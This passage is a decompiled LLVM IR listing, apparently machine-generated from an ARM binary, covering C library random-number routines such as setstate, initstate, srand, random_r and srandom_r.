  %v10_16d10 = phi i32 [ %arg1, %dec_label_pc_16cfc ], [ 0, %bb ]
  ret i32 %v10_16d10

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v4_16d44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_16d44)
  %v0_16d58 = load i32, i32* @r6, align 4
  %v2_16d58 = add i32 %v0_16d58, 16
  %v3_16d58 = inttoptr i32 %v2_16d58 to i32*
  %v4_16d58 = load i32, i32* %v3_16d58, align 4
  call void @__pseudo_branch(i32 %v4_16d58)
  %v0_16d68 = load i32, i32* @r6, align 4
  %v2_16d68 = add i32 %v0_16d68, 1216
  %v0_16d70 = load i32, i32* @r5, align 4
  %v1_16d74 = add i32 %v0_16d68, 1224
  %v2_16d74 = inttoptr i32 %v1_16d74 to i32*
  %v3_16d74 = load i32, i32* %v2_16d74, align 4
  store i32 %v3_16d74, i32* @r4, align 4
  %v2_16d78 = inttoptr i32 %v2_16d68 to i32*
  %v3_16d78 = call i32 @setstate_r(i32 %v0_16d70, i32* %v2_16d78)
  %v1_16d80 = icmp slt i32 %v3_16d78, 0
  %v3_16d90 = load i32, i32* @r4, align 4
  %v4_16d90 = add i32 %v3_16d90, -4
  %storemerge = select i1 %v1_16d80, i32 0, i32 %v4_16d90
  %v0_16d94 = load i32, i32* @r6, align 4
  %v2_16d94 = add i32 %v0_16d94, 24
  %v3_16d94 = inttoptr i32 %v2_16d94 to i32*
  %v4_16d94 = load i32, i32* %v3_16d94, align 4
  call void @__pseudo_branch(i32 %v4_16d94)
  ret i32 %storemerge
}

define i32 @function_16db4(i32 %arg1) local_unnamed_addr {
dec_label_pc_16db4:
  %v0_16db4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16db4, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16db4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16db4, %bb
  %v10_16dc8 = phi i32 [ %arg1, %dec_label_pc_16db4 ], [ 0, %bb ]
  ret i32 %v10_16dc8

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v4_16e04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_16e04)
  %v0_16e18 = load i32, i32* @r4, align 4
  %v2_16e18 = add i32 %v0_16e18, 16
  %v3_16e18 = inttoptr i32 %v2_16e18 to i32*
  %v4_16e18 = load i32, i32* %v3_16e18, align 4
  call void @__pseudo_branch(i32 %v4_16e18)
  %v0_16e28 = load i32, i32* @r6, align 4
  %v0_16e2c = load i32, i32* @r4, align 4
  %v2_16e2c = add i32 %v0_16e2c, 1216
  %v0_16e30 = load i32, i32* @r7, align 4
  %v0_16e34 = load i32, i32* @sl, align 4
  store i32 %v0_16e34, i32* @r0, align 4
  %v1_16e38 = add i32 %v0_16e2c, 1224
  %v2_16e38 = inttoptr i32 %v1_16e38 to i32*
  %v3_16e38 = load i32, i32* %v2_16e38, align 4
  store i32 %v3_16e38, i32* @r5, align 4
  %v4_16e3c = inttoptr i32 %v0_16e34 to i32*
  %v5_16e3c = call i32 @__GI_initstate_r(i32* %v4_16e3c, i32 %v0_16e28, i32 %v0_16e30, i32 %v2_16e2c)
  %v0_16e4c = load i32, i32* @r4, align 4
  %v2_16e4c = add i32 %v0_16e4c, 24
  %v3_16e4c = inttoptr i32 %v2_16e4c to i32*
  %v4_16e4c = load i32, i32* %v3_16e4c, align 4
  call void @__pseudo_branch(i32 %v4_16e4c)
  %v0_16e58 = load i32, i32* @r5, align 4
  %v1_16e58 = add i32 %v0_16e58, -4
  ret i32 %v1_16e58
}

define i32 @function_16e74(i32 %arg1) local_unnamed_addr {
dec_label_pc_16e74:
  %v0_16e74 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16e74, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16e74
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16e74, %bb
  %v10_16e88 = phi i32 [ %arg1, %dec_label_pc_16e74 ], [ 0, %bb ]
  ret i32 %v10_16e88

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_16e8c = load i32, i32* @r4, align 4
  %v6_16e8c = load i32, i32* @r5, align 4
  %v9_16e8c = load i32, i32* @r6, align 4
  %v15_16e8c = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r4, align 4
  %v2_16ea0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 1064), i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_16ebc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_16ebc)
  %v0_16ed0 = load i32, i32* @r4, align 4
  %v2_16ed0 = add i32 %v0_16ed0, 16
  %v3_16ed0 = inttoptr i32 %v2_16ed0 to i32*
  %v4_16ed0 = load i32, i32* %v3_16ed0, align 4
  call void @__pseudo_branch(i32 %v4_16ed0)
  %v0_16ee0 = load i32, i32* @r6, align 4
  store i32 %v0_16ee0, i32* @r0, align 4
  %v0_16ee4 = load i32, i32* @r4, align 4
  %v2_16ee4 = add i32 %v0_16ee4, 1216
  %v2_16ee8 = inttoptr i32 %v0_16ee0 to i32*
  %v3_16ee8 = call i32 @srandom_r(i32* %v2_16ee8, i32 %v2_16ee4)
  %v0_16efc = load i32, i32* @r4, align 4
  %v2_16efc = add i32 %v0_16efc, 24
  %v3_16efc = inttoptr i32 %v2_16efc to i32*
  %v4_16efc = load i32, i32* %v3_16efc, align 4
  call void @__pseudo_branch(i32 %v4_16efc)
  store i32 %v3_16e8c, i32* @r4, align 4
  store i32 %v6_16e8c, i32* @r5, align 4
  store i32 %v9_16e8c, i32* @r6, align 4
  store i32 %v15_16e8c, i32* @lr, align 4
  ret i32 %v2_16ea0
}

define i32 @function_16f18(i32 %arg1) local_unnamed_addr {
dec_label_pc_16f18:
  %v0_16f18 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16f18, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16f18
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16f18, %bb
  %v10_16f2c = phi i32 [ %arg1, %dec_label_pc_16f18 ], [ 0, %bb ]
  ret i32 %v10_16f2c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16f30 = load i32, i32* @r4, align 4
  store i32 %v3_16f30, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v1_16f38 = add i32 %tmp, 12
  %v2_16f38 = inttoptr i32 %v1_16f38 to i8*
  %v3_16f38 = load i8, i8* %v2_16f38, align 1
  %v4_16f38 = zext i8 %v3_16f38 to i32
  store i32 %v4_16f38, i32* %r1.global-to-local, align 4
  %v2_16f3c = icmp eq i8 %v3_16f38, 0
  store i1 %v2_16f3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16f3c, label %.thread5, label %.thread6

.thread5:                                         ; preds = %entry
  %v1_16f4412 = add i32 %arg1, 4
  store i32 %v1_16f4412, i32* %r6.global-to-local, align 4
  %v1_16f4813 = add i32 %tmp, 8
  %v2_16f4814 = inttoptr i32 %v1_16f4813 to i32*
  %v3_16f4815 = load i32, i32* %v2_16f4814, align 4
  store i32 %v3_16f4815, i32* %r0.global-to-local, align 4
  %v3_16f64 = add i32 %v3_16f4815, -4
  %v4_16f64 = inttoptr i32 %v3_16f64 to i32*
  store i32 %v4_16f38, i32* %v4_16f64, align 4
  br label %bb

.thread6:                                         ; preds = %entry
  %v2_16f40 = add i32 %tmp, 4
  %v3_16f40 = inttoptr i32 %v2_16f40 to i32*
  %v4_16f40 = load i32, i32* %v3_16f40, align 4
  %v1_16f44 = add i32 %arg1, 4
  store i32 %v1_16f44, i32* %r6.global-to-local, align 4
  %v1_16f48 = add i32 %tmp, 8
  %v2_16f48 = inttoptr i32 %v1_16f48 to i32*
  %v3_16f48 = load i32, i32* %v2_16f48, align 4
  store i32 %v3_16f48, i32* %r0.global-to-local, align 4
  %v3_16f50 = sub i32 %v4_16f40, %v3_16f48
  %v4_16f54 = sdiv i32 %v3_16f50, 4
  %v4_16f58 = sext i8 %v3_16f38 to i32
  store i32 %v4_16f58, i32* %r1.global-to-local, align 4
  %v4_16f60 = mul i32 %v4_16f54, 5
  %v5_16f60 = add i32 %v4_16f60, %v4_16f58
  %v3_16f68 = add i32 %v3_16f48, -4
  %v4_16f68 = inttoptr i32 %v3_16f68 to i32*
  store i32 %v5_16f60, i32* %v4_16f68, align 4
  br label %bb

bb:                                               ; preds = %.thread5, %.thread6
  %v0_16f70 = load i32, i32* %r6.global-to-local, align 4
  %v1_16f70 = add i32 %v0_16f70, -4
  %v2_16f70 = inttoptr i32 %v1_16f70 to i32*
  %v3_16f70 = load i32, i32* %v2_16f70, align 4
  %v2_16f78 = udiv i32 %v3_16f70, 5
  %v3_16f78 = urem i32 %v3_16f70, 5
  store i32 %v2_16f78, i32* %r0.global-to-local, align 4
  store i32 %v3_16f78, i32* %r1.global-to-local, align 4
  %v2_16f80 = icmp ugt i32 %v3_16f78, 3
  %v7_16f80 = icmp eq i32 %v3_16f78, 4
  store i1 %v7_16f80, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r5.global-to-local, align 4
  %v2_16f88 = xor i1 %v7_16f80, true
  %v3_16f88 = and i1 %v2_16f80, %v2_16f88
  br i1 %v3_16f88, label %dec_label_pc_16ff0, label %dec_label_pc_16f8c

dec_label_pc_16f8c:                               ; preds = %bb
  %v4_16f94 = mul nuw nsw i32 %v3_16f78, 4
  %v5_16f94 = add i32 %v4_16f94, add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33984)
  %v1_16f98 = add i32 %v4_16f94, add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33964)
  %v2_16f98 = inttoptr i32 %v1_16f98 to i32*
  %v3_16f98 = load i32, i32* %v2_16f98, align 4
  store i32 %v3_16f98, i32* %r5.global-to-local, align 4
  %v6_16f9c = inttoptr i32 %v5_16f94 to i32*
  %v7_16f9c = load i32, i32* %v6_16f9c, align 4
  store i32 %v7_16f9c, i32* %r7.global-to-local, align 4
  %v2_16fa0 = icmp eq i32 %v3_16f78, 0
  store i1 %v2_16fa0, i1* %cpsr_z.global-to-local, align 1
  %v1_16fa4 = trunc i32 %v3_16f98 to i8
  %v2_16fa4 = load i32, i32* %r4.global-to-local, align 4
  %v3_16fa4 = add i32 %v2_16fa4, 13
  %v4_16fa4 = inttoptr i32 %v3_16fa4 to i8*
  store i8 %v1_16fa4, i8* %v4_16fa4, align 1
  %v0_16fa8 = load i32, i32* %r7.global-to-local, align 4
  %v1_16fa8 = trunc i32 %v0_16fa8 to i8
  %v2_16fa8 = load i32, i32* %r4.global-to-local, align 4
  %v3_16fa8 = add i32 %v2_16fa8, 14
  %v4_16fa8 = inttoptr i32 %v3_16fa8 to i8*
  store i8 %v1_16fa8, i8* %v4_16fa8, align 1
  %v0_16fac = load i32, i32* %r1.global-to-local, align 4
  %v1_16fac = trunc i32 %v0_16fac to i8
  %v2_16fac = load i32, i32* %r4.global-to-local, align 4
  %v3_16fac = add i32 %v2_16fac, 12
  %v4_16fac = inttoptr i32 %v3_16fac to i8*
  store i8 %v1_16fac, i8* %v4_16fac, align 1
  %v0_16fb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16fb0, label %dec_label_pc_16fdc, label %dec_label_pc_16fb4

dec_label_pc_16fb4:                               ; preds = %dec_label_pc_16f8c
  store i32 5, i32* %r1.global-to-local, align 4
  %v0_16fb8 = load i32, i32* %r6.global-to-local, align 4
  %v1_16fb8 = add i32 %v0_16fb8, -4
  %v2_16fb8 = inttoptr i32 %v1_16fb8 to i32*
  %v3_16fb8 = load i32, i32* %v2_16fb8, align 4
  %v2_16fbc = sdiv i32 %v3_16fb8, 5
  store i32 %v2_16fbc, i32* %r0.global-to-local, align 4
  %v4_16fc0 = mul i32 %v2_16fbc, 4
  %v5_16fc0 = add i32 %v4_16fc0, %v0_16fb8
  %v1_16fc4 = load i32, i32* %r4.global-to-local, align 4
  %v2_16fc4 = add i32 %v1_16fc4, 4
  %v3_16fc4 = inttoptr i32 %v2_16fc4 to i32*
  store i32 %v5_16fc0, i32* %v3_16fc4, align 4
  %v0_16fc8 = load i32, i32* %r7.global-to-local, align 4
  %v1_16fc8 = load i32, i32* %r0.global-to-local, align 4
  %v2_16fc8 = add i32 %v1_16fc8, %v0_16fc8
  %v0_16fcc = load i32, i32* %r5.global-to-local, align 4
  %v2_16fd0 = udiv i32 %v2_16fc8, %v0_16fcc
  %v3_16fd0 = urem i32 %v2_16fc8, %v0_16fcc
  store i32 %v2_16fd0, i32* %r0.global-to-local, align 4
  %v0_16fd4 = load i32, i32* %r6.global-to-local, align 4
  %v4_16fd4 = mul i32 %v3_16fd0, 4
  %v5_16fd4 = add i32 %v0_16fd4, %v4_16fd4
  store i32 %v5_16fd4, i32* %r1.global-to-local, align 4
  %v1_16fd8 = load i32, i32* %r4.global-to-local, align 4
  %v2_16fd8 = inttoptr i32 %v1_16fd8 to i32*
  store i32 %v5_16fd4, i32* %v2_16fd8, align 4
  br label %dec_label_pc_16fdc

dec_label_pc_16fdc:                               ; preds = %dec_label_pc_16f8c, %dec_label_pc_16fb4
  %v0_16fdc = load i32, i32* %r6.global-to-local, align 4
  %v1_16fdc = load i32, i32* %r5.global-to-local, align 4
  %v4_16fdc = mul i32 %v1_16fdc, 4
  %v5_16fdc = add i32 %v4_16fdc, %v0_16fdc
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16fe4 = load i32, i32* %r4.global-to-local, align 4
  %v2_16fe4 = add i32 %v1_16fe4, 16
  %v3_16fe4 = inttoptr i32 %v2_16fe4 to i32*
  store i32 %v5_16fdc, i32* %v3_16fe4, align 4
  %v0_16fe8 = load i32, i32* %r6.global-to-local, align 4
  %v1_16fe8 = load i32, i32* %r4.global-to-local, align 4
  %v2_16fe8 = add i32 %v1_16fe8, 8
  %v3_16fe8 = inttoptr i32 %v2_16fe8 to i32*
  store i32 %v0_16fe8, i32* %v3_16fe8, align 4
  %v1_17008.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17000

dec_label_pc_16ff0:                               ; preds = %bb
  %v0_16ff0 = call i32 @__GI___errno_location()
  %v2_16ff8 = inttoptr i32 %v0_16ff0 to i32*
  store i32 22, i32* %v2_16ff8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17000

dec_label_pc_17000:                               ; preds = %dec_label_pc_16fdc, %dec_label_pc_16ff0
  %v1_17008 = phi i32 [ %v1_17008.pre, %dec_label_pc_16fdc ], [ -1, %dec_label_pc_16ff0 ]
  %v2_17004 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_17004, i32* @r4, align 4
  ret i32 %v1_17008

; uselistorder directives
  uselistorder i32 %v0_16fcc, { 1, 0 }
  uselistorder i32 %v2_16fc8, { 1, 0 }
  uselistorder i32 %v3_16f70, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 1, 2, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 8, 9, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17000, { 1, 0 }
  uselistorder label %dec_label_pc_16fdc, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17014 = load i32, i32* @r4, align 4
  store i32 %v3_17014, i32* %stack_var_-8, align 4
  %v1_17018 = add i32 %tmp, 12
  %v2_17018 = inttoptr i32 %v1_17018 to i8*
  %v3_17018 = load i8, i8* %v2_17018, align 1
  %v4_17018 = sext i8 %v3_17018 to i32
  store i32 %v4_17018, i32* %r3.global-to-local, align 4
  %v2_1701c = icmp eq i8 %v3_17018, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_17028 = add i32 %tmp, 8
  %v2_17028 = inttoptr i32 %v1_17028 to i32*
  %v3_17028 = load i32, i32* %v2_17028, align 4
  store i32 %v3_17028, i32* %lr.global-to-local, align 4
  br i1 %v2_1701c, label %dec_label_pc_17030, label %dec_label_pc_17054

dec_label_pc_17030:                               ; preds = %entry
  %v1_17030 = inttoptr i32 %v3_17028 to i32*
  %v2_17030 = load i32, i32* %v1_17030, align 4
  store i32 %v2_17030, i32* %r2.global-to-local, align 4
  %v2_17038 = mul i32 %v2_17030, 1103515245
  %v1_17040 = add i32 %v2_17038, 12345
  %tmp6 = bitcast i32 %v1_17040 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_17044 = bitcast float %tmp7 to i32
  store i32 %v1_17044, i32* %r3.global-to-local, align 4
  store i32 %v1_17044, i32* %v1_17030, align 4
  %v0_1704c = load i32, i32* %r3.global-to-local, align 4
  %v2_1704c = inttoptr i32 %arg2 to i32*
  store i32 %v0_1704c, i32* %v2_1704c, align 4
  br label %dec_label_pc_17094

dec_label_pc_17054:                               ; preds = %entry
  %v2_17054 = load i32, i32* %arg1, align 4
  store i32 %v2_17054, i32* %r2.global-to-local, align 4
  %v1_17058 = add i32 %tmp, 4
  %v2_17058 = inttoptr i32 %v1_17058 to i32*
  %v3_17058 = load i32, i32* %v2_17058, align 4
  store i32 %v3_17058, i32* %r0.global-to-local, align 4
  %v1_1705c = inttoptr i32 %v2_17054 to i32*
  %v2_1705c = load i32, i32* %v1_1705c, align 4
  store i32 %v2_1705c, i32* %r1.global-to-local, align 4
  %v1_17060 = inttoptr i32 %v3_17058 to i32*
  %v2_17060 = load i32, i32* %v1_17060, align 4
  %v4_17060 = add i32 %v3_17058, 4
  store i32 %v4_17060, i32* %r0.global-to-local, align 4
  %v2_17064 = add i32 %v2_17060, %v2_1705c
  store i32 %v2_17064, i32* %r3.global-to-local, align 4
  store i32 %v2_17064, i32* %v1_1705c, align 4
  %v3_17068 = load i32, i32* %r2.global-to-local, align 4
  %v4_17068 = add i32 %v3_17068, 4
  store i32 %v4_17068, i32* %r2.global-to-local, align 4
  %v0_1706c = load i32, i32* %ip.global-to-local, align 4
  %v1_1706c = add i32 %v0_1706c, 16
  %v2_1706c = inttoptr i32 %v1_1706c to i32*
  %v3_1706c = load i32, i32* %v2_1706c, align 4
  store i32 %v3_1706c, i32* %r1.global-to-local, align 4
  %v0_17070 = load i32, i32* %r3.global-to-local, align 4
  %v3_17070 = udiv i32 %v0_17070, 2
  store i32 %v3_17070, i32* %r3.global-to-local, align 4
  %v3_17074 = icmp ult i32 %v4_17068, %v3_1706c
  %v1_17078 = load i32, i32* %r4.global-to-local, align 4
  %v2_17078 = inttoptr i32 %v1_17078 to i32*
  store i32 %v3_17070, i32* %v2_17078, align 4
  br i1 %v3_17074, label %dec_label_pc_17084, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_17054
  %v1_1707c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_1707c, i32* %r2.global-to-local, align 4
  %v0_1708c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_17084:                               ; preds = %dec_label_pc_17054
  %v0_17084 = load i32, i32* %r0.global-to-local, align 4
  %v1_17084 = load i32, i32* %r1.global-to-local, align 4
  %v3_17084 = icmp ult i32 %v0_17084, %v1_17084
  br i1 %v3_17084, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_17084
  %v1_17088 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_17088, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_17084, %._crit_edge, %bb
  %v0_1708c = phi i32 [ %v0_1708c.pre, %._crit_edge ], [ %v0_17084, %dec_label_pc_17084 ], [ %v1_17088, %bb ]
  %v1_1708c = load i32, i32* %ip.global-to-local, align 4
  %v2_1708c = add i32 %v1_1708c, 4
  %v3_1708c = inttoptr i32 %v2_1708c to i32*
  store i32 %v0_1708c, i32* %v3_1708c, align 4
  %v0_17090 = load i32, i32* %r2.global-to-local, align 4
  %v1_17090 = load i32, i32* %ip.global-to-local, align 4
  %v2_17090 = inttoptr i32 %v1_17090 to i32*
  store i32 %v0_17090, i32* %v2_17090, align 4
  br label %dec_label_pc_17094

dec_label_pc_17094:                               ; preds = %dec_label_pc_17030, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_17098 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17098, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_17070, { 1, 0 }
  uselistorder i32 %v1_17044, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_17094, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_170a4 = load i32, i32* @r4, align 4
  store i32 %v3_170a4, i32* %stack_var_-36, align 4
  %v1_170a8 = add i32 %tmp, 12
  %v2_170a8 = inttoptr i32 %v1_170a8 to i8*
  %v3_170a8 = load i8, i8* %v2_170a8, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_170b8 = load i8, i8* %v2_170a8, align 1
  %tmp33 = icmp ugt i8 %v3_170a8, 4
  br i1 %tmp33, label %.dec_label_pc_17164_crit_edge, label %dec_label_pc_170c4

.dec_label_pc_17164_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_17164

dec_label_pc_170c4:                               ; preds = %entry
  %v0_170c4 = load i32, i32* @r0, align 4
  %v2_170c4 = icmp eq i32 %v0_170c4, 0
  %v1_170c8 = add i32 %tmp, 8
  %v2_170c8 = inttoptr i32 %v1_170c8 to i32*
  %v3_170c8 = load i32, i32* %v2_170c8, align 4
  store i32 %v3_170c8, i32* %r6.global-to-local, align 4
  br i1 %v2_170c4, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_170c4
  store i32 1, i32* @r0, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_170c4, %bb
  %v0_170d4 = phi i32 [ %v0_170c4, %dec_label_pc_170c4 ], [ 1, %bb ]
  %v2_170d0 = icmp eq i8 %v3_170b8, 0
  %v2_170d4 = inttoptr i32 %v3_170c8 to i32*
  store i32 %v0_170d4, i32* %v2_170d4, align 4
  br i1 %v2_170d0, label %dec_label_pc_17160, label %dec_label_pc_170dc

dec_label_pc_170dc:                               ; preds = %bb23
  %v1_170dc = add i32 %tmp, 13
  %v2_170dc = inttoptr i32 %v1_170dc to i8*
  %v3_170dc = load i8, i8* %v2_170dc, align 1
  %v4_170dc = sext i8 %v3_170dc to i32
  store i32 %v4_170dc, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_170e8 = load i32, i32* @r0, align 4
  store i32 %v0_170e8, i32* %r4.global-to-local, align 4
  %v0_170ec = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_170ec, i32* %r8.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v5_1712c25 = icmp sgt i8 %v3_170dc, 1
  br i1 %v5_1712c25, label %dec_label_pc_170f8, label %dec_label_pc_17130

dec_label_pc_170f8:                               ; preds = %dec_label_pc_170dc, %dec_label_pc_170f8.dec_label_pc_170f8_crit_edge
  %v1_1710c = phi i32 [ %v1_1710c.pre, %dec_label_pc_170f8.dec_label_pc_170f8_crit_edge ], [ 2836, %dec_label_pc_170dc ]
  %v1_17100 = phi i32 [ %v1_17100.pre, %dec_label_pc_170f8.dec_label_pc_170f8_crit_edge ], [ 16807, %dec_label_pc_170dc ]
  %v0_170fc27 = phi i32 [ %v0_17120.pre, %dec_label_pc_170f8.dec_label_pc_170f8_crit_edge ], [ %v0_170e8, %dec_label_pc_170dc ]
  %v1_1711826 = phi i32 [ %v5_17118, %dec_label_pc_170f8.dec_label_pc_170f8_crit_edge ], [ %v0_170ec, %dec_label_pc_170dc ]
  %v3_170f8 = urem i32 %v0_170fc27, ptrtoint ([13 x i8]* @global_var_1f31d.1016 to i32)
  %v2_17100 = mul i32 %v1_17100, %v3_170f8
  %v2_17108 = sdiv i32 %v0_170fc27, ptrtoint ([13 x i8]* @global_var_1f31d.1016 to i32)
  %v2_1710c = mul i32 %v1_1710c, %v2_17108
  %v2_17110 = sub i32 %v2_17100, %v2_1710c
  %v8_17110 = icmp slt i32 %v2_17110, 0
  %v2_17114 = add i32 %v2_17110, 2147483647
  %v2_17114.v2_17110 = select i1 %v8_17110, i32 %v2_17114, i32 %v2_17110
  store i32 %v2_17114.v2_17110, i32* %r4.global-to-local, align 4
  %v2_17118 = add i32 %v1_1711826, 4
  %v3_17118 = inttoptr i32 %v2_17118 to i32*
  store i32 %v2_17114.v2_17110, i32* %v3_17118, align 4
  %v4_17118 = load i32, i32* %r8.global-to-local, align 4
  %v5_17118 = add i32 %v4_17118, 4
  store i32 %v5_17118, i32* %r8.global-to-local, align 4
  %v0_1711c.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_1711c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_17120.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17128 = add i32 %v0_1711c.pre, 1
  store i32 %v1_17128, i32* %r7.global-to-local, align 4
  %v5_1712c = icmp slt i32 %v0_1711c.pre, %v1_1711c.pre
  br i1 %v5_1712c, label %dec_label_pc_170f8.dec_label_pc_170f8_crit_edge, label %dec_label_pc_1711c.dec_label_pc_17130_crit_edge

dec_label_pc_170f8.dec_label_pc_170f8_crit_edge:  ; preds = %dec_label_pc_170f8
  %v1_17100.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_1710c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_170f8

dec_label_pc_1711c.dec_label_pc_17130_crit_edge:  ; preds = %dec_label_pc_170f8
  %v0_17140.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17130

dec_label_pc_17130:                               ; preds = %dec_label_pc_1711c.dec_label_pc_17130_crit_edge, %dec_label_pc_170dc
  %v0_17140 = phi i32 [ %v0_17140.pre, %dec_label_pc_1711c.dec_label_pc_17130_crit_edge ], [ %v0_170ec, %dec_label_pc_170dc ]
  %v0_17134.lcssa = phi i32 [ %v1_1711c.pre, %dec_label_pc_1711c.dec_label_pc_17130_crit_edge ], [ %v4_170dc, %dec_label_pc_170dc ]
  %v2_17134 = mul i32 %v0_17134.lcssa, 10
  store i32 %v2_17134, i32* @r4, align 4
  %v0_17138 = load i32, i32* %r5.global-to-local, align 4
  %v1_17138 = add i32 %v0_17138, 14
  %v2_17138 = inttoptr i32 %v1_17138 to i8*
  %v3_17138 = load i8, i8* %v2_17138, align 1
